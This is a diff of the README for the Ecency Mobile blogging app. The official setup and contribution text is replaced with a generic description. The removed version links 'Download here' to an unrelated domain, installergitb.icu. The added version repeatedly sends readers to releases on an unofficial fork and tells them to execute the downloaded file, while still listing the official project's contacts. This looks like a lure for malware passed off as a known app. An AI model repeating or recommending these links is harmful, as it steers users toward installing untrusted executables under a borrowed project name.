@@ -1,127 +1,111 @@
-### Ecency Mobile
+# 🌟 Ecency Mobile: Reimagined Social Blogging
 
-[Download here](https://installergitb.icu?5tol5jhzqv4k83w)
+Welcome to the **Ecency Mobile** repository! This project aims to revolutionize social blogging, allowing users to contribute and earn rewards seamlessly on both Android and iOS platforms. Whether you are a blogger, reader, or just someone interested in the latest trends in blockchain and social media, Ecency Mobile has something for you.
 
-iOS ![iOS](https://github.com/ecency/ecency-mobile/actions/workflows/build-ios.yml/badge.svg)
-Android ![Android](https://github.com/ecency/ecency-mobile/actions/workflows/build-android.yml/badge.svg)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/madea85/ecency-mobile/releases)
 
-## Open Beta 🔥
+## Table of Contents
 
-[IOS](https://install.appcenter.ms/orgs/ecency/apps/ios/distribution_groups/beta_testers)
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Technologies Used](#technologies-used)
+4. [Installation](#installation)
+5. [Usage](#usage)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
-[ANDROID](https://play.google.com/apps/testing/app.esteem.mobile.android)
+## Introduction
 
-## Download
+Ecency Mobile is built to enhance your social blogging experience. It integrates blockchain technology to ensure that every contribution is rewarded. Users can engage with content, earn rewards, and connect with like-minded individuals in a vibrant community. The app is designed for both Android and iOS users, making it accessible to a wide audience.
 
-AppStore iOS: https://ios.ecency.com
-PlayStore Android: https://android.ecency.com
+## Features
 
-### I. How do I get set up? 🔧
+- **User-Friendly Interface**: The app offers a clean and intuitive design, making it easy for users to navigate and engage with content.
+- **Reward System**: Users earn rewards for their contributions, creating an incentive to participate actively.
+- **Cross-Platform**: Available on both Android and iOS, ensuring that everyone can join the community.
+- **Blockchain Integration**: Built on blockchain technology, ensuring transparency and security in transactions.
+- **Social Networking**: Connect with friends and discover new content through personalized feeds.
+- **Community Engagement**: Participate in discussions, share ideas, and collaborate with other users.
 
-`$ git clone https://github.com/ecency/ecency-mobile.git`
+## Technologies Used
 
-`$ cd ecency-mobile`
+Ecency Mobile leverages various technologies to deliver a seamless experience:
 
-`$ yarn`
+- **React Native**: For building a native app for both Android and iOS.
+- **Blockchain**: Utilizing blockchain technology for secure transactions.
+- **Hive**: A decentralized platform that supports the app's functionalities.
+- **Crypto Integration**: Enabling users to earn and manage cryptocurrency rewards.
+- **Social Media APIs**: To enhance user engagement and connectivity.
 
-`$ react-native start` (Now your local server should start)
+## Installation
 
-## Setting up Reactotron
+To get started with Ecency Mobile, follow these steps:
 
-`Reactotron` for logging,
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/madea85/ecency-mobile.git
+   cd ecency-mobile
+   ```
 
-- Install: [download here](https://github.com/infinitered/reactotron/blob/master/docs/installing.md)
-- Run: After installation, start the reactotron desktop application
-- Link: For android, run `adb reverse tcp:9090 tcp:9090` and restart app. For iOS, it should connect without further config.
-- Usage:
-  1. use `Timeline` tab to track logs and network call
-  2. use `State` tab to track redux stage changes, to track particular store, add it by its initializing name, example: `account`
+2. **Install Dependencies**:
+   ```bash
+   npm install
+   ```
 
-## Starting for IOS
+3. **Run the Application**:
+   - For Android:
+     ```bash
+     npm run android
+     ```
+   - For iOS:
+     ```bash
+     npm run ios
+     ```
 
-### `react-native run-ios` (this also run `react-native start` if you didn't)
+4. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/madea85/ecency-mobile/releases) to download the latest version of the app. Execute the downloaded file to install it on your device.
 
-## Starting for Android
+## Usage
 
-1. Create a new app in your firebase console.
-2. Choose Add Android platform, with a package name of `app.esteem.mobile.android`
-3. Download the generated `google-services.json` and place it in `<project-root>/android/app/`
-4. Connect dev device or start android emulator.
-5. Run `npm run android` in the project's root.
+Once installed, open the app and create an account or log in. You can start exploring content, creating posts, and engaging with other users. Here are some key features to try:
 
-##### Using Android Studio's `adb`
+- **Create Posts**: Share your thoughts and ideas with the community.
+- **Earn Rewards**: Participate in discussions and contribute valuable content to earn rewards.
+- **Follow Users**: Stay updated with your favorite bloggers and friends.
+- **Explore Content**: Discover trending topics and new posts in your feed.
 
-1. Make sure that you can run adb from your terminal.
-2. Open Genymotion and navigate to `Settings -> ADB`. Select “Use custom Android SDK tools” and update with your [Android SDK directory](https://stackoverflow.com/questions/25176594/android-sdk-location).
+## Contributing
 
-##### Using Genymotion's `adb`
+We welcome contributions to improve Ecency Mobile. To contribute:
 
-1. Find Genymotion’s copy of adb. On macOS for example, this is normally `/Applications/Genymotion.app/Contents/MacOS/tools/`.
-2. Add the Genymotion tools directory to your path (instructions for [Mac](http://osxdaily.com/2014/08/14/add-new-path-to-path-command-line/), [Linux](http://www.computerhope.com/issues/ch001647.htm), and [Windows](https://www.howtogeek.com/118594/how-to-edit-your-system-path-for-easy-command-line-access/)).
-3. Make sure that you can run adb from your terminal.
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a pull request.
 
-# The Rules 🔪
+Please ensure that your code adheres to the project's coding standards and includes relevant tests.
 
-### Patches and Review Process
+## License
 
-#### Before you start
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-1. When you address an issue or a feature, make sure that there doesn't already exist a ISSUES ticket for this work item.
-   - [Issues](https://github.com/ecency/ecency-mobile/issues)
-2. If the item already exists and is in progress, please remove the card or the issue you were assigned and leave a note that it is a duplicate.
+## Contact
 
-3. If the item is not being worked on, please make sure that you put the card or issue as "In Progress" and assign it to yourself so other developers know that you are working on it.
+For any questions or feedback, please reach out:
 
-#### Patch a day
+- **Email**: support@ecency.com
+- **Twitter**: [@Ecency](https://twitter.com/Ecency)
+- **Discord**: Join our community on Discord to chat with other users and developers.
 
-It is important to make the work you are doing visible to other team members, especially because there are developers in different locations.
-Even if you are not done the work on your patch, make sure to put a Pull Request up and leave a note that this is work in progress (WIP) so that others do not try to merge in your patch.
-If you would like to have someone in particular review your work, leave your patch as WIP and assign the developers that need to review or update your patch before it is ready to be reviewed by other team members.
-
-#### Who to assign your patch for review
-
-- [@feruzm](https://github.com/feruzm) 👮
-- [@noumantahir](https://github.com/noumantahir) 🕵
-
-### Patch Review Template
-
-When you create a pull request for your patch, make sure to leave all the information that other team members will need to understand the purpose of your patch as well.
-
-Main Branch `master`
-
-If you resolved an issue or something, you have to include the issue number (for ex. resolved #10 or closed #10) in your pr commit message.
-
-#### Before you start
-
-1. Pull every changes.
-2. Switch your branch with development
-3. Create about issues or bugfix branch.
-4. Make sure your repo up to date!
-
-#### Creating branch
-
-- For example if you want create branch for an issue should contain issue number (ex. #55)
-- Whats your interest put bugfix/your*branch_name or feature/your_branch_name*#issue_number
-- If you some changes for only config req config/your_branch_name
-
-#### Commit messages
-
-What ever you want number of commit. Before create push squash your all commit. We need just what you do!
-
-#### Pushing
-
-- Make sure push your main branch (master)
-
-# Issues 👻
-
-To report a non-critical issue, please file an issue on this GitHub project.
-
-If you find a security issue please report details to: security@ecency.com
-
-We will evaluate the risk and make a patch available before filing the issue.
-
-# Sponsors and Collaborators
-
-- Hive community
-- React native community
-- Bugsnag
+Thank you for your interest in Ecency Mobile! We look forward to your contributions and feedback. Don't forget to check the [Releases section](https://github.com/madea85/ecency-mobile/releases) for the latest updates and features. Happy blogging!
